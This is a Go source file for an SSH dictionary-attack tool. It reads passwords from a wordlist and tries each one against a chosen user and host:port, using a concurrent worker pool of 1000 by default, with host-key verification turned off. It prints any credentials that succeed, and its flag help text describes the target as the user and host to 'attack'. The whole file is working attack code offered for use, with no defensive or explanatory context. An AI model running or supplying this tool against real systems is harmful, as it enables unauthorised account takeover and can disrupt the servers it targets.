package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strings"
	"sync"

	"github.com/loveleshsharma/gohive"
	flag "github.com/spf13/pflag"
	"golang.org/x/crypto/ssh"
)

func main() {
	var (
		u  string
		p  string
		h  string
		ps int
	)

	flag.StringVarP(&u, "user", "u", "", "The user you would like to attack")
	flag.StringVarP(&p, "wordlist", "w", "", "The wordlist to use for dictionary attack")
	flag.StringVarP(&h, "host", "h", "", "The host you want to attack. (host:port)")
	flag.IntVarP(&ps, "poolsize", "s", 1000, "How many concurrent workers can run together")

	flag.Parse()

	var wg sync.WaitGroup

	if p == "" {
		flag.Usage()
		log.Fatal("flag \"wordlist\" cannot be empty")
	}

	if u == "" {
		flag.Usage()
		log.Fatal("flag \"usage\" cannot be empty")
	}

	if ps == 0 {
		flag.Usage()
		log.Fatal("flag \"poolsize\" cannot be 0")
	}

	if h == "" {
		flag.Usage()
		log.Fatal("flag \"host\" cannot be empty")
	} else if !strings.Contains(h, ":") {
		flag.Usage()
		log.Fatal("flag \"host\" : usage: host:port")
	}

	file, err := os.Open(p)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	pool := gohive.NewFixedSizePool(ps)

	for scanner.Scan() {
		wg.Add(1)

		v := scanner.Text()

		pool.Submit(func() {
			defer wg.Done()

			// fmt.Println("trying password", v)
			conn, err := ssh.Dial("tcp", h, &ssh.ClientConfig{
				User:            u,
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				Auth: []ssh.AuthMethod{
					ssh.Password(v),
				},
			})
			if err != nil {
				return
			}
			conn.Close()

			fmt.Printf("found match for %s: %s:%s\n", h, u, v)
		})
	}
	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

	wg.Wait()
}
